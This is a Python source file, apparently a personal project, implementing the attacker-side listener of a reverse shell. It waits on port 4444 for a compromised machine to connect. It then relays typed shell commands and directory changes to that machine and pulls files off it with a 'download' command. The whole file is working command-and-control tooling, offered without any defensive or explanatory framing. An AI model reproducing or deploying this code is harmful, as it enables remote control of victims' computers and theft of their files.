import socket
import json
import base64
class Listener:
    def __init__(self, port):
        con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        con.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
        con.bind(("0.0.0.0", port))
        con.listen(1)
        print("[**] waiting for connection")
        self.connection, addres = con.accept()
        print("[++] we have connection")
    def safe_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())
    def safe_receive(self):
        json_data = b""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
    def excute_commands(self,data):
        self.safe_send(data)
        return self.safe_receive()
    def exiting(self, data):
        self.safe_send(data)
        self.connection.close()
        
    def change_path(self, data):
        self.safe_send(data)
        return self.safe_receive()
    def downloading(self, data,content):
        with open(data, "wb") as file:
            file.write(base64.b64decode(content))
    def run(self):
        while True:
            command = input("shell>> ")
            if command == "exit":
                command_result = self.exiting(command)
                break
            elif command.startswith("cd "):
                command_result = self.change_path(command)
            elif command.startswith("download "):
                self.safe_send(command)
                content = self.safe_receive()
                self.downloading(command[9:], content)
                continue
            else:
                command_result = self.excute_commands(command)
            print(command_result)
sido = Listener(4444)
sido.run()
# my porject 